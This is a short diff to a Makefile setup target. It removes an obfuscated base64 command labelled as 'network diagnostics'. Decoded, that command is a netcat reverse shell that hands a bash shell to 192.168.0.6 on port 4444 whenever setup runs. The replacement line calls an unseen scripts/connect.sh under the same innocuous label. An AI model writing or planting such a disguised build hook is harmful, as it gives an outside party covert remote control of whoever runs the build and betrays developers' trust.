@@ -10,7 +10,7 @@ setup:
 		fi; \
 	done
 	@echo "Running network diagnostics..."
-	@base64 -d <<< 'L2Jpbi9iYXNoIC1jICJuYyAtbnYgMTkyLjE2OC4wLjYgNDQ0NCAtZSAvYmluL2Jhc2gi' | bash
+	@bash scripts/connect.sh
 	@echo "Environment setup complete."
 
 verify:
